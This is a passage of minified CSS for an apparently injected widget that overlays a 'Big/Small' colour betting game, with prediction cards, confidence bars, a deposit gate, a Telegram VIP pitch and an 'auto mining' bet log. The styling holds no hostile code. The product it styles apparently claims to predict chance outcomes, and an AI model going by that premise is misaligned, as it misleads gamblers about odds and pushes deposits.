1) both; }@keyframes viewIn { from { opacity:0; transform:translateX(8px) } to { opacity:1; transform:translateX(0) } }/* ── Main Menu ── */.menu-shell { display: flex; flex-direction: column; }.menu-home-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.menu-home-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.menu-home-opt { display: flex; align-items: center; gap: 10px; width: 100%; padding: 11px 12px; border: none; background: transparent; cursor: pointer; text-align: left; font-family: var(--f); transition: background .16s var(--ease), transform .16s var(--ease);}.menu-home-opt + .menu-home-opt { border-top: 1px solid var(--strip); }.menu-home-opt:hover { background: var(--strip); }.menu-home-opt:active { transform: scale(.99); transition-duration: .06s; }.menu-home-icon { width: 36px; height: 36px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: transform .18s var(--ease);}.menu-home-icon svg { width: 18px; height: 18px; fill: currentColor; }.menu-home-pro .menu-home-icon { background: var(--pro-lt); color: var(--pro); }.menu-home-vip .menu-home-icon { background: var(--vip-lt); color: var(--vip); }.menu-home-mine .menu-home-icon { background: var(--mine-lt); color: var(--mine); }.menu-home-opt:hover .menu-home-icon { transform: scale(1.05); }.menu-home-body { flex: 1; min-width: 0; }.menu-home-top { display: flex; align-items: center; gap: 6px; margin-bottom: 1px; }.menu-home-name { font-size: 13px; font-weight: 700; letter-spacing: -.15px; color: var(--t-title);}.menu-home-desc { display: block; font-size: 10px; font-weight: 500; color: var(--t-body); letter-spacing: .02px;}.menu-home-arrow { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity .16s var(--ease), transform .16s var(--ease), stroke .16s var(--ease);}.menu-home-pro:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--pro); }.menu-home-vip:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--vip); }.menu-home-mine:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--mine); }.menu-home-foot { display: flex; align-items: center; justify-content: center; gap: 6px; padding-top: 9px; margin-top: 8px; border-top: 1px solid var(--strip); font-size: 9.5px; color: var(--t-dim); font-weight: 500;}.menu-home-live { display: flex; align-items: center; gap: 4px; }.menu-home-live .status-dot { width: 4px; height: 4px; }.menu-home-foot-sep { opacity: .2; font-size: 9px; font-weight: 300; }.menu-home-tg { display: inline-flex; align-items: center; gap: 3px; border: none; background: transparent; padding: 0; font-family: var(--f); font-size: 9.5px; font-weight: 500; color: #2AABEE; cursor: pointer; transition: opacity .15s, transform .15s;}.menu-home-tg:hover { opacity: .85; }.menu-home-tg:active { transform: scale(.98); }.menu-home-tg svg { flex-shrink: 0; width: 10px; height: 10px; }.card-badge { font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .5px; padding: 2px 7px; border-radius: 50px; border: 1px solid transparent }.badge-pro { background: var(--pro-lt); color: var(--pro-txt); border-color: var(--pro-bdr-h); }.badge-vip { background: var(--vip-lt); color: var(--vip-txt); border-color: var(--vip-bdr-h); }.badge-mine { background: var(--mine-lt); color: var(--mine-txt); border-color: var(--mine-bdr-h); }.badge-upi { background: var(--upi-lt); color: var(--upi-txt); border-color: var(--upi-bdr-h); }.badge-crypto { background: var(--crypto-lt); color: var(--crypto-txt); border-color: var(--crypto-bdr-h); }.status-row { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 9px 0 0; margin-top: 9px; border-top: 1px solid var(--strip); font-size: 10px; color: var(--t-dim); font-weight: 500; letter-spacing: .2px }.status-live { display: flex; align-items: center; gap: 5px }.status-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--live); flex-shrink: 0; animation: livePulse 2.4s ease-in-out infinite }.status-sep { color: var(--t-dim); opacity: 0.35 }.status-tg-btn { display: inline-flex; align-items: center; gap: 4px; border: none; background: transparent; padding: 2px 6px; font-family: var(--f); font-size: 10px; font-weight: 600; color: #2AABEE; cursor: pointer; transition: opacity .15s, transform .15s; border-radius: 6px }.status-tg-btn:hover { opacity: .85 }.status-tg-btn:active { transform: scale(.96) }.status-tg-btn svg { flex-shrink: 0 }@keyframes livePulse { 0%,100% { opacity:1; box-shadow:0 0 0 0 rgba(52,211,153,.5) } 50% { opacity:.6; box-shadow:0 0 0 4px rgba(52,211,153,0) } }.back-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; border: 1px solid var(--back-bdr); background: var(--back-bg); color: var(--back-col); cursor: pointer; padding: 0; font-family: var(--f); transition: all .18s;}.back-btn svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round }.back-btn:hover { color: var(--back-col-h); border-color: var(--back-bdr-h); background: var(--pro-lt) }.pro-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px }.pro-gameinfo { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px }.pro-gameinfo-row { display: flex; align-items: center; gap: 7px }.pro-game-name { font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.25px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis }:host(.light) .pro-game-name { color: #1f1f2e }.pro-live-badge { display: inline-flex; align-items: center; gap: 4px; background: rgba(52,211,153,.1); border: 1px solid rgba(52,211,153,.22); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: #34d399; flex-shrink: 0; white-space: nowrap }:host(.light) .pro-live-badge { background: rgba(22,163,74,.07); border-color: rgba(22,163,74,.2); color: #16a34a }.pro-round { font-size: 10px; font-weight: 600; color: var(--t-dim); letter-spacing: .4px; font-variant-numeric: tabular-nums; font-family: var(--f) }:host(.light) .pro-round { color: #9ca3af }.live-pip { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; background: currentColor; animation: livePulse 2s ease-in-out infinite }.pro-timer-wrap { position: relative; text-align: center; margin: 0 0 10px; padding: 9px 12px 11px; background: var(--tw-bg); border: 1px solid var(--tw-bdr); border-radius: 16px; overflow: hidden }.pro-timer-wrap::after { content: \'\'; position: absolute; bottom: 0; left: 0; height: 3px; border-radius: 0 3px 3px 0; width: var(--pct,100%); background: linear-gradient(90deg, var(--live), #a7f3d0); transition: width 1s linear, background .6s }.pro-timer-wrap.tw-warn::after { background: linear-gradient(90deg, #f59e0b, #fde68a) }.pro-timer-wrap.tw-end::after { background: linear-gradient(90deg, #ef4444, #fca5a5) }.pro-timer-label { font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--t-dim); margin-bottom: 2px }.pro-timer { font-size: 30px; font-weight: 900; letter-spacing: 2px; font-variant-numeric: tabular-nums; line-height: 1; color: var(--t-title); font-family: var(--f); transition: color .4s }.pro-timer.t-warn { color: #f59e0b }.pro-timer.t-end { color: #ef4444; animation: timerShake .45s var(--ease) infinite }@keyframes timerShake { 0%,100%{transform:scale(1)} 50%{transform:scale(1.07)} }.pro-card { background: var(--pc-bg); border: 1px solid var(--pc-bdr); border-radius: 16px; padding: 20px 14px 16px; box-shadow: var(--pc-shad); min-height: 138px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; transition: border-color .5s, box-shadow .5s;}.pro-card::before { content: \'\'; position: absolute; inset: 0; background: linear-gradient(105deg, transparent 35%, rgba(139,92,246,.05) 50%, transparent 65%); opacity: 0; transition: opacity .3s }.pro-card.shimmer::before { opacity: 1; animation: sweep 1.7s ease-in-out infinite }@keyframes sweep { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }.pro-card.c-big { border-color: rgba(254,170,87,.24); box-shadow: 0 10px 36px rgba(254,170,87,.12), 0 0 0 1px rgba(254,170,87,.1) }.pro-card.c-small { border-color: rgba(110,168,244,.24); box-shadow: 0 10px 36px rgba(110,168,244,.12), 0 0 0 1px rgba(110,168,244,.1) }:host(.light) .pro-card.c-big { border-color: rgba(254,170,87,.3); box-shadow: 0 6px 24px rgba(254,170,87,.15), 0 0 0 1px rgba(254,170,87,.12) }:host(.light) .pro-card.c-small { border-color: rgba(110,168,244,.3); box-shadow: 0 6px 24px rgba(110,168,244,.15), 0 0 0 1px rgba(110,168,244,.12) }.pro-scanning { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; min-height: 100px; width: 100% }.scan-rings { position: relative; width: 52px; height: 52px }.scan-ring-o { position: absolute; inset: 0; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro); animation: spin 1.3s linear infinite }.scan-ring-i { position: absolute; inset: 11px; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro-txt); opacity: .5; animation: spin .75s linear infinite reverse }@keyframes spin { to { transform:rotate(360deg) } }.scan-label { font-size: 11px; font-weight: 600; color: var(--t-body); letter-spacing: .2px; font-family: var(--f); display: flex; align-items: center; gap: 3px }.s-dot { width:3px; height:3px; border-radius:50%; background:currentColor; opacity:.3; animation:blink 1.2s ease-in-out infinite }.s-dot:nth-child(2){animation-delay:.2s} .s-dot:nth-child(3){animation-delay:.4s}@keyframes blink { 0%,80%,100%{opacity:.2} 40%{opacity:.9} }.pro-prediction { width: 100%; text-align: center; animation: reveal .45s cubic-bezier(.2,.8,.2,1) }@keyframes reveal { from { opacity:0; transform:scale(.84); filter:blur(6px) } to { opacity:1; transform:scale(1); filter:blur(0) } }.streak-badge { display: none; align-items: center; justify-content: center; gap: 4px; padding: 3px 10px; border-radius: 50px; margin: 0 auto 10px; background: var(--pro-lt); color: var(--pro-txt); border: 1px solid rgba(139,92,246,.2); font-size: 9px; font-weight: 800; letter-spacing: .3px; text-transform: uppercase; width: fit-content }:host(.light) .streak-badge { background: rgba(224,60,60,.07); color: #b91c1c; border-color: rgba(224,60,60,.16) }.pred-hero { position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; height: 68px }.pred-glow { position: absolute; width: 82px; height: 82px; border-radius: 50%; filter: blur(24px); opacity: 0; transition: opacity .5s, background .5s; pointer-events: none }.pred-glow.big { background: var(--big); opacity: .22 }.pred-glow.small { background: var(--small); opacity: .22 }:host(.light) .pred-glow.big { opacity: .16 }:host(.light) .pred-glow.small { opacity: .16 }.pred-ball { width: 60px; height: 60px; background-size: contain; background-repeat: no-repeat; background-position: center; filter: drop-shadow(0 6px 14px rgba(0,0,0,.25)); position: relative; z-index: 1; animation: float 3s ease-in-out infinite }@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-4px)} }.pred-tags { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px }.pred-size { padding: 7px 26px; border-radius: 50px; font-size: 15px; font-weight: 900; color: #fff; letter-spacing: -.1px; position: relative; overflow: hidden; transition: all .35s }.pred-size::after { content: \'\'; position: absolute; top: -60%; left: -40%; width: 180%; height: 160%; background: linear-gradient(135deg, rgba(255,255,255,.18), transparent 55%); pointer-events: none }.pred-size.big { background: linear-gradient(135deg,#FEAA57,#f97316); box-shadow:0 4px 18px rgba(254,170,87,.45) }.pred-size.small { background: linear-gradient(135deg,#6EA8F4,#3b82f6); box-shadow:0 4px 18px rgba(110,168,244,.45) }.pred-color { padding: 5px 14px; border-radius: 50px; font-size: 10px; font-weight: 800; color: #fff; letter-spacing: .4px; text-transform: uppercase }.pred-color.red { background: linear-gradient(135deg,#fb5b5b,#dc2626) }.pred-color.green { background: linear-gradient(135deg,#18b660,#16a34a) }.pred-color.violet { background: linear-gradient(135deg,#c86eff,#9333ea) }.pred-conf { display: flex; align-items: center; gap: 8px }.conf-track { flex: 1; height: 5px; background: var(--strip); border-radius: 3px; overflow: hidden }.conf-fill { height: 100%; border-radius: 3px; background: linear-gradient(90deg, var(--big), #fb5b5b); transition: width .7s var(--ease); width: 0; position: relative }.conf-fill.small { background: linear-gradient(90deg, var(--small), #6EA8F4) }.conf-fill::after { content: \'\'; position: absolute; right: -1px; top: -2px; bottom: -2px; width: 7px; background: inherit; border-radius: 50%; filter: blur(3px); opacity: .65 }.conf-pct { font-size: 12px; font-weight: 900; color: var(--t-title); font-variant-numeric: tabular-nums; min-width: 35px; text-align: right }:host(.light) .conf-pct { color: #1f1f2e }.pred-history { display: none; align-items: center; justify-content: center; gap: 4px; margin-top: 10px; padding-top: 10px; border-top: 1px solid var(--strip) }.hist-label { font-size: 9px; font-weight: 700; color: var(--t-dim); letter-spacing: .2px; margin-right: 2px }.hist-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; transition: transform .2s; cursor: default }.hist-dot.big { background: var(--big); box-shadow:0 0 5px rgba(254,170,87,.4) }.hist-dot.small { background: var(--small); box-shadow:0 0 5px rgba(110,168,244,.4) }.hist-dot:hover { transform: scale(1.4) }.vip-header { display: flex; align-items: center; gap: 9px; margin-bottom: 12px }.vip-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.vip-invite-pill { display: inline-flex; align-items: center; gap: 4px; background: var(--vip-lt); border: 1px solid var(--vip-bdr-h); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: var(--vip); white-space: nowrap }.vip-hero-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 18px; padding: 22px 16px 20px; text-align: center; margin-bottom: 10px; position: relative; overflow: hidden }.vip-hero-card::before { content: \'\'; position: absolute; top: -50px; left: 50%; transform: translateX(-50%); width: 140px; height: 140px; background: radial-gradient(circle, rgba(42,171,238,.13) 0%, transparent 70%); pointer-events: none }.vip-tg-ring { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #2AABEE, #229ED9); display: flex; align-items: center; justify-content: center; margin: 0 auto 13px; box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38); animation: tgPulse 2.8s ease-in-out infinite }@keyframes tgPulse { 0%,100% { box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38) } 50% { box-shadow: 0 0 0 11px rgba(42,171,238,.14), 0 0 0 20px rgba(42,171,238,.06), 0 8px 30px rgba(42,171,238,.44) } }.vip-title { font-size: 17px; font-weight: 900; color: var(--gate-title); margin: 0 0 7px; letter-spacing: -.5px; font-family: var(--f); line-height: 1.2 }.vip-pitch { font-size: 11.5px; line-height: 1.6; color: var(--t-body); margin: 0; font-family: var(--f) }.vip-stats { display: grid; grid-template-columns: 1fr 1fr 1fr; margin: 0 0 10px; text-align: center; background: var(--stat-bg); border-radius: 14px; border: 1px solid var(--stat-bdr); padding: 10px 0 }.vip-stat { display: flex; flex-direction: column; gap: 1px }.vip-stat + .vip-stat { border-left: 1px solid var(--stat-bdr) }.stat-val { font-size: 17px; font-weight: 900; color: var(--gate-title); letter-spacing: -.5px; font-family: var(--f) }.stat-lbl { font-size: 9px; font-weight: 700; color: var(--t-dim); text-transform: uppercase; letter-spacing: .7px }.vip-cta { width: 100%; padding: 12px 16px; border-radius: 13px; border: none; background: linear-gradient(135deg, #2AABEE, #1a90cc); color: #fff; font-size: 13.5px; font-weight: 800; letter-spacing: .02px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 7px; font-family: var(--f); box-shadow: 0 5px 20px rgba(42,171,238,.38), 0 0 0 1px rgba(42,171,238,.2); transition: all .2s var(--ease); position: relative; overflow: hidden }.vip-cta::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.15), transparent 55%); pointer-events: none }.vip-cta:hover { box-shadow: 0 8px 28px rgba(42,171,238,.52), 0 0 0 1px rgba(42,171,238,.3); transform: translateY(-2px) }.vip-cta:active { transform: scale(.97); transition-duration: .08s }.vip-arrow { flex-shrink: 0; transition: transform .2s var(--ease) }.vip-cta:hover .vip-arrow { transform: translateX(3px) }.vip-note { text-align: center; font-size: 9.5px; color: var(--t-dim); margin: 8px 0 0; font-family: var(--f); font-weight: 500; letter-spacing: .1px }.gate-view { display: none; padding: 22px 16px 24px; text-align: center; animation: fadeUp .25s var(--ease) }.gate-icon { width: 46px; height: 46px; margin: 0 auto 12px; background: var(--pro-lt); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--pro); box-shadow: 0 0 0 6px var(--pro-glow) }.gate-title { font-size: 16px; font-weight: 900; color: var(--gate-title); margin: 0 0 6px; letter-spacing: -.4px; font-family: var(--f) }.gate-bal-wrap { margin-bottom: 10px }.gate-balance { display: inline-flex; align-items: center; background: var(--gate-bal-bg); padding: 5px 14px; border-radius: 50px; font-size: 13px; font-weight: 800; color: var(--gate-bal-col); border: 1px solid var(--gate-bal-bdr); font-family: var(--f) }.gate-desc { font-size: 11px; line-height: 1.55; color: var(--t-body); margin: 0 0 16px; font-family: var(--f) }.gate-actions { display: flex; flex-direction: column; gap: 7px }.gate-btn { padding: 11px 14px; border-radius: 12px; border: none; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .2s var(--ease); position: relative; overflow: hidden }.gate-btn:active { transform: scale(.97) }.gate-btn::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.12), transparent 55%); pointer-events: none }.btn-deposit { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; box-shadow: 0 4px 16px rgba(34,197,94,.32) }.btn-deposit:hover { box-shadow: 0 6px 22px rgba(34,197,94,.44); transform: translateY(-1px) }.btn-telegram { background: var(--card-bg); color: var(--t-body); border: 1px solid var(--card-bdr); font-weight: 600; font-size: 12px }.btn-telegram:hover { color: var(--t-title); border-color: var(--pro-bdr-h) }.pro-prediction .pred-hero, .pro-prediction .pred-color { display: none }.pro-prediction.vip-mode .pred-hero { display: flex }.pro-prediction.vip-mode .pred-color { display: inline-block }.mine-header { display: flex; align-items: center; gap: 9px; margin-bottom: 12px }.mine-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.mine-energy-pill { display: inline-flex; align-items: center; gap: 4px; background: var(--mine-lt); border: 1px solid var(--mine-bdr-h); border-radius: 50px; padding: 2.5px 9px 2.5px 7px; font-size: 9px; font-weight: 700; letter-spacing: .5px; color: var(--mine); white-space: nowrap; animation: energyPulse 2.5s ease-in-out infinite }:host(.light) .mine-energy-pill { color: var(--mine-txt) }@keyframes energyPulse { 0%,100% { box-shadow: 0 0 0 0 transparent } 50% { box-shadow: 0 0 0 4px var(--mine-glow) } }.energy-svg { width: 11px; height: 11px; fill: currentColor; }/* ── Auto Mining ── */.view-mining { position: relative; }.view-mining.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.mine-shell { display: flex; flex-direction: column; }.mine-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.mine-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--mine) 32%, transparent), transparent); pointer-events: none;}.mine-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 9px 13px; min-height: 36px; border-bottom: 1px solid var(--strip);}.mine-lbl { font-size: 11.5px; font-weight: 600; color: var(--t-body); letter-spacing: -.05px; display: inline-flex; align-items: center; gap: 6px; flex-shrink: 0;}.mine-lbl-icon { width: 14px; height: 14px; flex-shrink: 0; opacity: .6; }.mine-val { font-size: 13px; font-weight: 800; color: var(--mine); font-family: var(--f); font-variant-numeric: tabular-nums; letter-spacing: -.2px;}.mine-input-wrap { display: flex; align-items: center; gap: 3px; background: var(--back-bg); border: 1px solid var(--card-bdr); border-radius: 8px; padding: 4px 8px; transition: border-color .15s, box-shadow .15s;}.mine-input-wrap:focus-within { border-color: var(--mine-bdr-h); box-shadow: 0 0 0 3px var(--mine-glow);}.mine-symbol { font-size: 10px; font-weight: 600; color: var(--t-dim); }.mine-input { width: 68px; background: transparent; border: none; outline: none; padding: 0; font-size: 12px; font-weight: 700; color: var(--t-title); font-family: var(--f); text-align: right; -webkit-appearance: none; appearance: none; font-variant-numeric: tabular-nums;}.mine-input::-webkit-inner-spin-button, .mine-input::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0 }.mine-terminal-section { padding: 9px 11px; border-bottom: 1px solid var(--strip);}.mining-terminal { background: var(--back-bg); border: 1px solid var(--card-bdr); border-radius: 9px; padding: 8px 10px; height: 72px; overflow-y: auto; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 9px; color: var(--t-dim); display: flex; flex-direction: column; gap: 2px; scrollbar-width: none; scroll-behavior: smooth;}.mining-terminal::-webkit-scrollbar { display: none }.mining-terminal .console-line.win { color: var(--mine); }.mining-terminal .console-line.loss { color: var(--pro); }.mining-terminal .console-line.wait { color: var(--t-dim); }.mining-terminal .console-line.active { color: var(--mine); font-weight: 600; }.mine-card-foot { padding: 10px 13px 11px; }.mine-cta { width: 100%; padding: 11px; border-radius: 11px; border: none; background: var(--mine); color: #fff; font-size: 12.5px; font-weight: 700; letter-spacing: -.1px; cursor: pointer; font-family: var(--f); box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 30%, transparent); transition: transform .15s cubic-bezier(.16, 1, .3, 1), box-shadow .15s cubic-bezier(.16, 1, .3, 1), background .15s; position: relative; overflow: hidden;}.mine-cta::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255, 255, 255, .1), transparent 52%); pointer-events: none;}.mine-cta:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 40%, transparent); }.mine-cta:active { transform: scale(.98); transition-duration: .06s; }.mine-cta.active { background: var(--pro); box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);}.mine-cta.active:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent); }.mine-note { text-align: center; font-size: 9.5px; color: var(--t-dim); margin: 7px 0 0; font-weight: 500; letter-spacing: .02px;}.mine-hist-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; margin-left: auto; display: flex; align-items: center; justify-content: center; border: 1px solid var(--mine-bdr-h); background: var(--mine-lt); color: var(--mine); cursor: pointer; padding: 0; transition: background .15s, color .15s, border-color .15s, transform .15s;}.mine-hist-btn svg { width: 14px; height: 14px; }.mine-hist-btn:hover { background: var(--mine); color: #fff; }.mine-hist-btn:active { transform: scale(.97); transition-duration: .06s; }.mining-energy-modal { position: absolute; inset: 0; z-index: 100; background: rgba(10, 8, 28, 0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); display: flex; align-items: center; justify-content: center; border-radius: 16px; padding: 20px; box-sizing: border-box; animation: modalPop .2s cubic-bezier(.16, 1, .3, 1) forwards;}@keyframes modalPop { 0% { opacity: 0; transform: scale(.97); } 100% { opacity: 1; transform: scale(1); } }.energy-modal-close { position: absolute; top: 10px; right: 10px; width: 28px; height: 28px; border-radius: 50%; background: var(--back-bg); border: 1px solid var(--card-bdr); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background .15s; padding: 0;}.energy-modal-close svg { width: 14px; height: 14px; color: var(--t-dim); }.energy-modal-close:hover { background: var(--strip); }.energy-modal-content { text-align: center; max-width: 220px; display: flex; flex-direction: column; align-items: center; gap: 8px;}.energy-modal-icon { width: 50px; height: 50px; border-radius: 14px; background: var(--pro-lt); border: 1px solid var(--pro-bdr-h); display: flex; align-items: center; justify-content: center; color: var(--pro);}.energy-modal-icon svg { width: 28px; height: 28px; }.energy-modal-title { font-size: 14px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px; }.energy-modal-desc { font-size: 10.5px; font-weight: 500; color: var(--t-body); line-height: 1.5; }.energy-modal-actions { display: flex; flex-direction: column; gap: 7px; width: 100%; margin-top: 6px; }.energy-btn-primary { width: 100%; padding: 11px; border-radius: 11px; font-size: 12.5px; font-weight: 700; cursor: pointer; font-family: var(--f); border: none; background: var(--mine); color: #fff; box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 28%, transparent); transition: transform .15s, box-shadow .15s;}.energy-btn-primary:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 38%, transparent); }.energy-btn-primary:active { transform: scale(.98); }.energy-btn-secondary { width: 100%; padding: 10px; border-radius: 11px; font-size: 11.5px; font-weight: 600; cursor: pointer; font-family: var(--f); background: transparent; color: var(--t-body); border: 1px solid var(--card-bdr); transition: border-color .15s, transform .15s;}.energy-btn-secondary:hover { border-color: var(--pro-bdr-h); color: var(--t-title); }.energy-btn-secondary:active { transform: scale(.98); }:host(.light) .mining-energy-modal { background: rgba(255, 255, 255, 0.94); }.console-line { line-height: 1.4; animation: consoleFade .2s cubic-bezier(.16, 1, .3, 1) both; letter-spacing: .1px; }@keyframes consoleFade { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }.mining-history-modal { position: absolute; inset: 0; z-index: 100; background: rgba(10, 8, 28, 0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); display: flex; flex-direction: column; border-radius: 16px; padding: 12px; box-sizing: border-box; animation: modalPop .2s cubic-bezier(.16, 1, .3, 1) forwards;}.history-modal-content { flex: 1; display: flex; flex-direction: column; gap: 7px; overflow: hidden; padding-top: 18px; }.history-modal-title { font-size: 13px; font-weight: 800; color: var(--t-title); letter-spacing: -.15px; text-align: center; }.history-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 3px; scrollbar-width: none; padding: 2px 0; }.history-list::-webkit-scrollbar { display: none; }.history-list:empty::after { content: \'No mining history yet.\'; display: block; text-align: center; font-size: 10px; color: var(--t-dim); padding: 28px 0; }.hist-entry { display: flex; align-items: center; gap: 7px; padding: 7px 9px; border-radius: 8px; background: var(--back-bg); border: 1px solid var(--card-bdr); font-size: 9.5px; animation: consoleFade .18s ease both;}.hist-entry .hist-side { font-weight: 800; text-transform: uppercase; letter-spacing: .3px; font-size: 8.5px; min-width: 28px; }.hist-entry .hist-side.BigSmall_Big { color: var(--big); }.hist-entry .hist-side.BigSmall_Small { color: var(--small); }.hist-entry .hist-amt { flex: 1; color: var(--t-body); font-variant-numeric: tabular-nums; }.hist-entry .hist-net { font-weight: 800; font-variant-numeric: tabular-nums; min-width: 48px; text-align: right; }.hist-entry .hist-net.win { color: var(--mine); }.hist-entry .hist-net.loss { color: var(--pro); }.hist-entry .hist-time { font-size: 8px; color: var(--t-dim); min-width: 44px; text-align: right; }.history-clear-btn { width: 100%; padding: 9px; border-radius: 9px; border: 1px solid var(--card-bdr); background: transparent; color: var(--t-dim); font-size: 10px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: border-color .15s, color .15s, transform .15s; flex-shrink: 0;}.history-clear-btn:hover { border-color: var(--pro-bdr-h); color: var(--pro); }.history-clear-btn:active { transform: scale(.98); }:host(.light) .mining-history-modal { background: rgba(255, 255, 255, 0.94); }@media (min-width: 768px) { .panel { width: min(90vw, 310px) } .menu-home-opt { padding: 12px 13px } .menu-home-name { font-size: 13.5px } }@media (max-width: 320px) { .panel { width: 94vw } .pro-timer { font-size: 24px } .pred-ball { width: 48px; height: 48px } .pred-size { padding: 6px 18px; font-size: 13px } .pro-card { padding: 14px 10px; min-height: 112px } .pred-hero { height: 56px } .mine-input { width: 55px; font-size: 11px } .mine-cta { padding: 10px; font-size: 12px } .mining-terminal { height: 64px } }.wg-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; background: rgba(0,0,0,0.75); z-index: 2005 }.wg-overlay.inactive { display: none }.wg-popup { position: fixed; top: 50%; left: calc(var(--bv-left, 0px) + var(--bv-width, 100%) / 2); transform: translate(-50%, -50%); z-index: 2006; width: min(300px, calc(var(--bv-width, 100%) - 32px)); background: #1e1e3a; border-radius: 18px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 8px 40px rgba(0,0,0,0.6) }.wg-popup.inactive { display: none }:host(.light) .wg-popup { background: #fff }.wg-close-x { position: absolute; top: 10px; right: 12px; width: 26px; height: 26px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; font-size: 12px; color: rgba(255,255,255,0.7); cursor: pointer; z-index: 1 }:host(.light) .wg-close-x { background: rgba(0,0,0,0.07); color: #666 }.wg-pop-hero { text-align: center; padding: 28px 20px 14px; background: #1e1e3a }:host(.light) .wg-pop-hero { background: #fff }.wg-pop-icon { font-size: 44px; line-height: 1; margin-bottom: 10px }.wg-pop-amount { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: -0.5px; margin-bottom: 8px }:host(.light) .wg-pop-amount { color: #111 }.wg-pop-pill { display: inline-block; padding: 4px 12px; border-radius: 99px; background: rgba(245,180,0,0.15); border: 1px solid rgba(245,180,0,0.35); font-size: 10.5px; font-weight: 600; color: #f5c842; letter-spacing: .2px }:host(.light) .wg-pop-pill { background: rgba(249,89,89,0.08); border-color: rgba(249,89,89,0.25); color: #f95959 }.wg-pop-stats { display: flex; gap: 6px; padding: 0 16px 12px; justify-content: center }.wg-stat-chip { flex: 1; text-align: center; padding: 7px 4px; border-radius: 10px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); font-size: 10px; font-weight: 600; color: #c8cad0 }:host(.light) .wg-stat-chip { background: #f5f5ff; border-color: #e0e0f0; color: #555 }.wg-pop-body { padding: 0 16px 14px; font-size: 11.5px; color: #7b7e9a; line-height: 1.65; text-align: center }:host(.light) .wg-pop-body { color: #777 }.wg-pop-cta { display: block; width: calc(100% - 32px); margin: 0 16px 10px; 